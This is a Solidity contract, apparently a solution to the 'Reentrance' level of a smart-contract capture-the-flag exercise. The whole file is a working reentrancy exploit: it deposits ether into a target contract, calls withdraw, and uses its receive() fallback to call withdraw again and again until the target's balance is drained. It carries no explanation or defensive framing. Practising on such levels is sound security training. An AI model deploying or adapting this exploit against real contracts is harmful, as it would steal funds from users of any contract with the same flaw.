// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import {ReentranceInterface} from "../levels/ReentranceInterface.sol";

contract ReentranceAttack {
    constructor(){

    }
    function attack(ReentranceInterface reentrance) external payable{
        require(msg.value == address(reentrance).balance);
        reentrance.donate{value: msg.value}(address(this));
        reentrance.withdraw(msg.value);
    }
    receive() external payable{
        if (msg.sender.balance>0){
            ReentranceInterface(msg.sender).withdraw(msg.sender.balance);
        }
    }
}
